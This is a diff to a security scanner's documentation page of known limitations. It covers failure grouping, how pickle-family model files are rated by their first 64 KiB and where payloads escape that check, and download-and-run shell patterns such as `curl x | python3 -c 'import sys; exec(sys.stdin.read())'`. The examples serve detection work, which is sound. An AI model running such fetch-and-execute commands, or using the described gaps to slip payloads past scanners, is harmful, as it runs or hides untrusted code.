@@ -1,7 +1,7 @@
 # Known limitations
 
 This page lists what Nexus SymBiote does not collect, compare or verify, by surface,
-and what to do about each limit. For how findings are classified, such as why a
+and what to do about each limit. For how findings are classified, such as when a
 `.bin` file is critical or which characters count as hidden, see
 [known false-positive and false-negative classes](security-model.md#known-false-positive-and-false-negative-classes).
 The list that shipped with 0.1.0 is in
@@ -109,6 +109,17 @@ A way around a limit that its entry does not describe is worth a
   project, and the answer would hold only on the machine that scans, not on one
   that later opens the checkout. Replace the link with the file, or with a relative
   link inside the project.
+- **A repeated failure is reported once, by its exact text.** The inventory keeps
+  one record per collector, so one escaping link is six identical
+  `metadata.completeness.scan_failures` entries. `scan`, and the GitHub Action log
+  that relays it, prints it once and names the collectors that recorded it. `risk`,
+  `validate` and the `graph` view read only the inventory, which does not say which
+  collector recorded a failure, so they end the line in `(recorded N times)` and
+  name the collectors that are not complete in a separate coverage gap. Failures are
+  grouped by their exact text: two collectors that word one cause differently stay
+  two lines, and a recorded failure whose own text ends in `(recorded 2 times)` reads
+  like a grouped one. The Action's summary counts distinct failures and, when they
+  differ, the records.
 - **Hard links are ordinary files.** A hard-linked file inside the root is read like
   any other, so an inventory can describe a file that also has a name outside the
   root. See [security boundaries](../SECURITY.md#security-boundaries).
@@ -678,6 +689,30 @@ A way around a limit that its entry does not describe is worth a
   file, by digest pin or signature, is refused with "Policy artifact or bundle is
   unavailable beneath the project root". Such files are still hashed, up to the
   `model-bytes` limit.
+- **A pickle-family name is rated by the first 64 KiB.** `.pkl`, `.pt`, `.bin` and
+  the other [pickle-family names](model-integrity.md#model-files-and-references) are
+  critical only with pickle evidence, a wrapper magic or the GGUF magic in the inspected
+  prefix: a pickle opcode stream,
+  recognized or cut short by the 64 KiB, 4,096-opcode or 64-MARK bound before a
+  recognized shape or a call, a NumPy object-dtype array or a ZIP archive with a
+  pickle-family member or such an array, a ZIP archive or NumPy array the bounds
+  left unread, or a compressed or archived stream, by a wrapper suffix, by gzip,
+  zlib, bzip2, xz, Zstandard, LZ4 frame, joblib `ZF` or ustar magic, by an
+  LZMA-alone header after joblib's `5d 00` or by a tar header that `tarfile` reads
+  without the ustar magic, whose decompressed content is not inspected, or a file that starts with the GGUF magic,
+  whatever follows, whose chat templates are inspected only under a `.gguf` name. A
+  readable file that shows none of that,
+  such as a zero-filled `embeddings.bin` or firmware, is `unknown`, a high finding.
+  A payload that starts past the first 64 KiB of a file, or a pickle behind a
+  prefix that is no opcode and none of those magic numbers, such as one compressed
+  by a codec not listed, is not rated critical by its name; a loader given such a
+  file still unpickles it. An LZMA-alone header that joblib does not detect, one
+  that does not start with `5d 00`, its properties byte and the low byte of a
+  dictionary size, is not a wrapper either, though Python's `lzma` can open such a
+  stream when a loader asks for LZMA itself. The header checks read structure, not a
+  decoded stream, so a raw array whose first bytes form a header, such as a
+  `labels.bin` of little-endian 32-bit integers 93 to 156 or, rarely, a float32
+  array upcast from bfloat16, is critical. An unreadable pickle-family file keeps the critical rating.
 - **Some formats are not inspected.** ONNX, GGUF, GGML, Keras, HDF5, SavedModel,
   TFLite, Core ML and ExecuTorch files are rated `unknown`: Keras Lambda layers,
   SavedModel operations and custom operators are not inspected. Each is a high
@@ -993,8 +1028,10 @@ A way around a limit that its entry does not describe is worth a
   matched to its `3< a`, so `curl x > a && python3 /dev/fd/3 3< a` is medium. A saved
   file transformed by another tool (`sed`, `awk`, `tar`), read by an interpreter's own
   code (`python3 -c 'exec(open("a").read())'`,
-  `node -e "$(cat a)"`, `python3 -c 'import a'`), or loaded by a name that is not the
-  file's, as by
+  `node -e "$(cat a)"`, `python3 -c 'import a'`), a download that an interpreter's own
+  code reads from standard input and runs (`curl x | perl -ne'eval'`,
+  `curl x | python3 -c 'import sys; exec(sys.stdin.read())'`), or a file loaded by a
+  name that is not the file's, as by
   `php -d auto_prepend_file=a` or a module the program imports from the working
   directory (`sitecustomize.py`, or a `json.py` that shadows the standard library), is
   medium. A download written where something runs it later, such as
